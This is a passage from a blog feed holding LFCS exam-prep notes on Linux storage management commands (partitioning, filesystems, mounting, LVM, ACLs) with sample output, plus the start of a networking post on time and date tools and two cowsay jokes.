</span><span class='line'>/ Be free and open and breezy! Enjoy!     \
</span><span class='line'>| Things won't get any better so get used |
</span><span class='line'>\ to it.                                  /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Storage Management]]></title>
    <link href="http://chousensha.github.io/blog/2018/03/02/lfcs-prep-storage-management/"/>
    <updated>2018-03-02T13:12:06-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/03/02/lfcs-prep-storage-management</id>
    <content type="html"><![CDATA[<p>Various commands for the LFCS Storage Management domain, which at the time of this post can be found at <a href="https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf">https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf</a></p>

<!-- more -->


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/storage.png" title="linux storage" alt="storage objectives"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/storage2.png" title="linux storage" alt="storage objectives"></p>

<h4>mdadm</h4>

<blockquote><p>manage MD devices aka Linux Software RAID</p></blockquote>

<h4>lsblk</h4>

<blockquote><p>list block devices</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lsblk
</span><span class='line'>NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
</span><span class='line'>fd0               2:0    1    4K  0 disk
</span><span class='line'>sda               8:0    0   20G  0 disk
</span><span class='line'>├─sda1            8:1    0  500M  0 part /boot
</span><span class='line'>└─sda2            8:2    0 19.5G  0 part
</span><span class='line'>  ├─centos-root 253:0    0 17.5G  0 lvm  /
</span><span class='line'>  └─centos-swap 253:1    0    2G  0 lvm  [SWAP]
</span><span class='line'>sdb               8:16   0    1G  0 disk
</span><span class='line'>sr0              11:0    1 1024M  0 rom  </span></code></pre></td></tr></table></div></figure>


<ul>
<li>output filesystem info</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lsblk -f
</span><span class='line'>NAME         FSTYPE      LABEL UUID                                   MOUNTPOINT
</span><span class='line'>fd0                                                                   
</span><span class='line'>sda                                                                   
</span><span class='line'>├─sda1       xfs               ef67363c-0fb5-4680-aa53-572e5e38d8d0   /boot
</span><span class='line'>└─sda2       LVM2_member       0R3HDI-jqHC-WdoO-gDZ5-ScPb-JdkI-y9sIvD
</span><span class='line'>  ├─centos-root
</span><span class='line'>             xfs               71dd7ac4-ba5b-4e8a-a706-a51264d85900   /
</span><span class='line'>  └─centos-swap
</span><span class='line'>             swap              41edd5da-8142-4fc6-9e96-e8b7a08c2ae9   [SWAP]
</span><span class='line'>sdb                                                                   
</span><span class='line'>sr0                                                </span></code></pre></td></tr></table></div></figure>


<h4>fdisk</h4>

<blockquote><p>manipulate disk partition table</p></blockquote>

<ul>
<li>list partition tables</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fdisk -l /dev/sda
</span><span class='line'>
</span><span class='line'>Disk /dev/sda: 21.5 GB, 21474836480 bytes, 41943040 sectors
</span><span class='line'>Units = sectors of 1 * 512 = 512 bytes
</span><span class='line'>Sector size (logical/physical): 512 bytes / 512 bytes
</span><span class='line'>I/O size (minimum/optimal): 512 bytes / 512 bytes
</span><span class='line'>Disk label type: dos
</span><span class='line'>Disk identifier: 0x000e124e
</span><span class='line'>
</span><span class='line'>   Device Boot      Start         End      Blocks   Id  System
</span><span class='line'>/dev/sda1   *        2048     1026047      512000   83  Linux
</span><span class='line'>/dev/sda2         1026048    41943039    20458496   8e  Linux LVM</span></code></pre></td></tr></table></div></figure>


<ul>
<li>fdisk menu</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Command action
</span><span class='line'>   a   toggle a bootable flag
</span><span class='line'>   b   edit bsd disklabel
</span><span class='line'>   c   toggle the dos compatibility flag
</span><span class='line'>   d   delete a partition
</span><span class='line'>   g   create a new empty GPT partition table
</span><span class='line'>   G   create an IRIX (SGI) partition table
</span><span class='line'>   l   list known partition types
</span><span class='line'>   m   print this menu
</span><span class='line'>   n   add a new partition
</span><span class='line'>   o   create a new empty DOS partition table
</span><span class='line'>   p   print the partition table
</span><span class='line'>   q   quit without saving changes
</span><span class='line'>   s   create a new empty Sun disklabel
</span><span class='line'>   t   change a partition's system id
</span><span class='line'>   u   change display/entry units
</span><span class='line'>   v   verify the partition table
</span><span class='line'>   w   write table to disk and exit
</span><span class='line'>   x   extra functionality (experts only)</span></code></pre></td></tr></table></div></figure>


<h4>gdisk</h4>

<blockquote><p>Interactive GUID partition table (GPT) manipulator</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdisk /dev/sdb
</span><span class='line'>GPT fdisk (gdisk) version 0.8.6
</span><span class='line'>
</span><span class='line'>Partition table scan:
</span><span class='line'>  MBR: not present
</span><span class='line'>  BSD: not present
</span><span class='line'>  APM: not present
</span><span class='line'>  GPT: not present
</span><span class='line'>
</span><span class='line'>Creating new GPT entries.
</span><span class='line'>
</span><span class='line'>Command (? for help): ?
</span><span class='line'>b back up GPT data to a file
</span><span class='line'>c change a partition's name
</span><span class='line'>d delete a partition
</span><span class='line'>i show detailed information on a partition
</span><span class='line'>l list known partition types
</span><span class='line'>n add a new partition
</span><span class='line'>o create a new empty GUID partition table (GPT)
</span><span class='line'>p print the partition table
</span><span class='line'>q quit without saving changes
</span><span class='line'>r recovery and transformation options (experts only)
</span><span class='line'>s sort partitions
</span><span class='line'>t change a partition's type code
</span><span class='line'>v verify disk
</span><span class='line'>w write table to disk and exit
</span><span class='line'>x extra functionality (experts only)
</span><span class='line'>? print this menu</span></code></pre></td></tr></table></div></figure>


<h4>parted</h4>

<blockquote><p>a partition manipulation program</p></blockquote>

<ul>
<li>list all partitions</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>parted -l
</span><span class='line'>Model: VMware, VMware Virtual S (scsi)
</span><span class='line'>Disk /dev/sda: 21.5GB
</span><span class='line'>Sector size (logical/physical): 512B/512B
</span><span class='line'>Partition Table: msdos
</span><span class='line'>Disk Flags:
</span><span class='line'>
</span><span class='line'>Number  Start   End     Size    Type     File system  Flags
</span><span class='line'> 1      1049kB  525MB   524MB   primary  xfs          boot
</span><span class='line'> 2      525MB   21.5GB  20.9GB  primary               lvm
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Error: /dev/sdb: unrecognised disk label
</span><span class='line'>Model: VMware, VMware Virtual S (scsi)                                    
</span><span class='line'>Disk /dev/sdb: 1074MB
</span><span class='line'>Sector size (logical/physical): 512B/512B
</span><span class='line'>Partition Table: unknown
</span><span class='line'>Disk Flags:
</span><span class='line'>
</span><span class='line'>Model: Linux device-mapper (linear) (dm)
</span><span class='line'>Disk /dev/mapper/centos-swap: 2147MB
</span><span class='line'>Sector size (logical/physical): 512B/512B
</span><span class='line'>Partition Table: loop
</span><span class='line'>Disk Flags:
</span><span class='line'>
</span><span class='line'>Number  Start  End     Size    File system     Flags
</span><span class='line'> 1      0.00B  2147MB  2147MB  linux-swap(v1)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Model: Linux device-mapper (linear) (dm)
</span><span class='line'>Disk /dev/mapper/centos-root: 18.8GB
</span><span class='line'>Sector size (logical/physical): 512B/512B
</span><span class='line'>Partition Table: loop
</span><span class='line'>Disk Flags:
</span><span class='line'>
</span><span class='line'>Number  Start  End     Size    File system  Flags
</span><span class='line'> 1      0.00B  18.8GB  18.8GB  xfs</span></code></pre></td></tr></table></div></figure>


<h4>mkfs</h4>

<blockquote><p>build a Linux filesystem</p></blockquote>

<ul>
<li><p>-t # filesystem type</p></li>
<li><p>types of filesystems</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkfs.
</span><span class='line'>mkfs.btrfs   mkfs.ext2    mkfs.ext4    mkfs.minix   mkfs.vfat    
</span><span class='line'>mkfs.cramfs  mkfs.ext3    mkfs.fat     mkfs.msdos   mkfs.xfs  </span></code></pre></td></tr></table></div></figure>


<h4>tune2fs</h4>

<blockquote><p>adjust  tunable  filesystem  parameters  on  ext2/ext3/ext4 filesystems</p></blockquote>

<ul>
<li>set label</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tune2fs -L label device</span></code></pre></td></tr></table></div></figure>


<h4>e2label</h4>

<blockquote><p>Change the label on an ext2/ext3/ext4 filesystem</p></blockquote>

<h4>dumpe2fs</h4>

<blockquote><p>dump ext2/ext3/ext4 filesystem information</p></blockquote>

<h4>xfs_db</h4>

<blockquote><p>debug an XFS filesystem</p></blockquote>

<h4>mount</h4>

<blockquote><p>mount a filesystem</p>

<p>mount -t type device dir</p></blockquote>

<ul>
<li>-a # mount all filesystems</li>
<li>-r # mount read-only</li>
<li><p>-o # mount options</p></li>
<li><p>list all mounted filesystems</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -l
</span><span class='line'>sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime,seclabel)
</span><span class='line'>proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
</span><span class='line'>devtmpfs on /dev type devtmpfs (rw,nosuid,seclabel,size=926484k,nr_inodes=231621,mode=755)
</span><span class='line'>securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
</span><span class='line'>tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,seclabel)
</span><span class='line'>devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,seclabel,gid=5,mode=620,ptmxmode=000)
</span><span class='line'>tmpfs on /run type tmpfs (rw,nosuid,nodev,seclabel,mode=755)
</span><span class='line'>tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,seclabel,mode=755)
</span><span class='line'>cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)
</span><span class='line'>pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
</span><span class='line'>cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
</span><span class='line'>cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
</span><span class='line'>cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
</span><span class='line'>cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
</span><span class='line'>cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpuacct,cpu)
</span><span class='line'>cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
</span><span class='line'>cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
</span><span class='line'>cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
</span><span class='line'>cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
</span><span class='line'>cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_prio,net_cls)
</span><span class='line'>configfs on /sys/kernel/config type configfs (rw,relatime)
</span><span class='line'>/dev/mapper/rhel-root on / type xfs (rw,relatime,seclabel,attr2,inode64,noquota)
</span><span class='line'>selinuxfs on /sys/fs/selinux type selinuxfs (rw,relatime)
</span><span class='line'>systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=33,pgrp=1,timeout=300,minproto=5,maxproto=5,direct)
</span><span class='line'>hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,seclabel)
</span><span class='line'>debugfs on /sys/kernel/debug type debugfs (rw,relatime)
</span><span class='line'>mqueue on /dev/mqueue type mqueue (rw,relatime,seclabel)
</span><span class='line'>nfsd on /proc/fs/nfsd type nfsd (rw,relatime)
</span><span class='line'>/dev/sda1 on /boot type xfs (rw,relatime,seclabel,attr2,inode64,noquota)
</span><span class='line'>sunrpc on /var/lib/nfs/rpc_pipefs type rpc_pipefs (rw,relatime)
</span><span class='line'>tmpfs on /run/user/0 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=188412k,mode=700)
</span><span class='line'>gvfsd-fuse on /run/user/0/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_id=0,group_id=0)
</span><span class='line'>fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)</span></code></pre></td></tr></table></div></figure>


<h4>umount</h4>

<blockquote><p>unmount file systems</p></blockquote>

<h4>blkid</h4>

<blockquote><p>locate/print block device attributes</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>blkid
</span><span class='line'>/dev/sda1: UUID="b8e2fb99-bf4c-4632-883b-8ed5c2350b1e" TYPE="xfs"
</span><span class='line'>/dev/sda2: UUID="PLxZXl-aHBf-9VPQ-XOd1-eLMH-cWOW-NhjdcP" TYPE="LVM2_member"
</span><span class='line'>/dev/mapper/rhel-root: UUID="2c0268ac-c31a-462d-b5b9-41bdfbecd75d" TYPE="xfs"
</span><span class='line'>/dev/mapper/rhel-swap: UUID="6544d880-b634-4566-a68d-d3a58cec4cf6" TYPE="swap"</span></code></pre></td></tr></table></div></figure>


<h4>xfs_info</h4>

<blockquote><p>expand an XFS filesystem</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xfs_info /dev/sda1
</span><span class='line'>meta-data=/dev/sda1              isize=512    agcount=4, agsize=65536 blks
</span><span class='line'>         =                       sectsz=512   attr=2, projid32bit=1
</span><span class='line'>         =                       crc=1        finobt=0 spinodes=0
</span><span class='line'>data     =                       bsize=4096   blocks=262144, imaxpct=25
</span><span class='line'>         =                       sunit=0      swidth=0 blks
</span><span class='line'>naming   =version 2              bsize=4096   ascii-ci=0 ftype=1
</span><span class='line'>log      =internal               bsize=4096   blocks=2560, version=2
</span><span class='line'>         =                       sectsz=512   sunit=0 blks, lazy-count=1
</span><span class='line'>realtime =none                   extsz=4096   blocks=0, rtextents=0</span></code></pre></td></tr></table></div></figure>


<h4>mkswap</h4>

<blockquote><p>set up a Linux swap area</p></blockquote>

<h4>swapon, swapoff</h4>

<blockquote><p>enable/disable devices and files for paging and swapping</p></blockquote>

<ul>
<li>display swap usage</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>swapon -s
</span><span class='line'>Filename              Type        Size    Used    Priority
</span><span class='line'>/dev/dm-1        </span></code></pre></td></tr></table></div></figure>


<h4>pvscan</h4>

<blockquote><p>scan all disks for physical volumes</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pvscan
</span><span class='line'>  PV /dev/sda2   VG centos          lvm2 [19.51 GiB / 40.00 MiB free]
</span><span class='line'>  Total: 1 [19.51 GiB] / in use: 1 [19.51 GiB] / in no VG: 0 [0   ]</span></code></pre></td></tr></table></div></figure>


<h4>vgscan</h4>

<blockquote><p>scan all disks for volume groups and rebuild caches</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgscan
</span><span class='line'>  Reading volume groups from cache.
</span><span class='line'>  Found volume group "centos" using metadata type lvm2</span></code></pre></td></tr></table></div></figure>


<h4>lvscan</h4>

<blockquote><p>scan (all disks) for Logical Volumes</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvscan
</span><span class='line'>  ACTIVE            '/dev/centos/swap' [2.00 GiB] inherit
</span><span class='line'>  ACTIVE            '/dev/centos/root' [17.47 GiB] inherit</span></code></pre></td></tr></table></div></figure>


<h4>pvcreate</h4>

<blockquote><p>initialize a disk or partition for use by LVM</p></blockquote>

<h4>vgcreate</h4>

<blockquote><p>create a volume group</p></blockquote>

<h4>vgs</h4>

<blockquote><p>report information about volume groups</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgs
</span><span class='line'>  VG     #PV #LV #SN Attr   VSize  VFree
</span><span class='line'>  centos   1   2   0 wz--n- 19.51g 40.00m</span></code></pre></td></tr></table></div></figure>


<h4>lvcreate</h4>

<blockquote><p>create a logical volume in an existing volume group</p></blockquote>

<h4>vgextend</h4>

<blockquote><p>add physical volumes to a volume group</p></blockquote>

<h4>lvextend</h4>

<blockquote><p>extend the size of a logical volume</p></blockquote>

<h4>lvremove</h4>

<blockquote><p>remove a logical volume</p></blockquote>

<h4>pvmove</h4>

<blockquote><p>move physical extents</p></blockquote>

<h4>vgreduce</h4>

<blockquote><p>reduce a volume group</p></blockquote>

<h4>pvremove</h4>

<blockquote><p>remove a physical volume</p></blockquote>

<h4>getfacl</h4>

<blockquote><p>get file access control lists</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>getfacl out.txt
</span><span class='line'># file: out.txt
</span><span class='line'># owner: root
</span><span class='line'># group: root
</span><span class='line'>user::rw-
</span><span class='line'>group::r--
</span><span class='line'>other::r--</span></code></pre></td></tr></table></div></figure>


<h4>setfacl</h4>

<blockquote><p>set file access control lists</p></blockquote>

<ul>
<li>give user dave read and write rights on a file</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>setfacl -m u:dave:rw file</span></code></pre></td></tr></table></div></figure>


<ul>
<li>set default ACL recursively on a directory for a group and give read and directory traversal permissions (but no execute for files)</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>setfacl -R -m d:g:rockstars:rX folder</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>_________________________________________
</span><span class='line'>/ Q: How many IBM types does it take to   \
</span><span class='line'>| change a light bulb? A: Fifteen. One to |
</span><span class='line'>| do it, and fourteen to write document   |
</span><span class='line'>| number                                  |
</span><span class='line'>|                                         |
</span><span class='line'>| GC7500439-0001, Multitasking            |
</span><span class='line'>| Incandescent Source System Facility,    |
</span><span class='line'>|                                         |
</span><span class='line'>| of which 10% of the pages state only    |
</span><span class='line'>| "This page intentionally                |
</span><span class='line'>|                                         |
</span><span class='line'>| left blank", and 20% of the definitions |
</span><span class='line'>| are of the form "A:.....                |
</span><span class='line'>|                                         |
</span><span class='line'>| consists of sequences of non-blank      |
</span><span class='line'>\ characters separated by blanks".        /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Networking]]></title>
    <link href="http://chousensha.github.io/blog/2018/03/01/lfcs-prep-networking/"/>
    <updated>2018-03-01T14:12:20-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/03/01/lfcs-prep-networking</id>
    <content type="html"><![CDATA[<p>Various commands for the LFCS Networking domain, which at the time of this post can be found at <a href="https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf">https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf</a></p>

<!-- more -->


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/network.png" title="networking" alt="linux networking"></p>

<h4>hwclock</h4>

<blockquote><p>query or set the hardware clock (RTC)</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hwclock
</span><span class='line'>Wed 18 Oct 2017 07:24:51 PM EEST  -1.042307 seconds</span></code></pre></td></tr></table></div></figure>


<h4>timedatectl</h4>

<blockquote><p>Control the system time and date</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>timedatectl
</span><span class='line'>      Local time: Wed 2017-10-18 17:26:49 EEST
</span><span class='line'>  Universal time: Wed 2017-10-18 14:26:49 UTC
</span><span class='line'>        RTC time: Wed 2017-10-18 17:26:49
</span><span class='line'>       Time zone: Europe/Bucharest (EEST, +0300)
</span><span class='line'>     NTP enabled: no
</span><span class='line'>NTP synchronized: no
</span><span class='line'> RTC in local TZ: no
</span><span class='line'>      DST active: yes
</span><span class='line'> Last DST change: DST began at
</span><span class='line'>                  Sun 2017-03-26 02:59:59 EET
</span><span class='line'>                  Sun 2017-03-26 04:00:00 EEST
</span><span class='line'> Next DST change: DST ends (the clock jumps one hour backwards) at
</span><span class='line'>                  Sun 2017-10-29 03:59:59 EEST
</span><span class='line'>                  Sun 2017-10-29 03:00:00 EET</span></code></pre></td></tr></table></div></figure>


<h4>date</h4>

<blockquote><p>print or set the system date and time</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@tron ~]# date
</span><span class='line'>Tue Sep 19 12:40:58 EEST 2017</span></code></pre></td></tr></table></div></figure>


<ul>
<li>get the date of a relative point in time</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>date -d "50 days"
</span><span class='line'>Wed Nov  8 11:42:08 EET 2017
</span><span class='line'>date -d "50 days ago"
</span><span class='line'>Mon Jul 31 12:43:24 EEST 2017</span></code></pre></td></tr></table></div></figure>


<h4>ifconfig</h4>

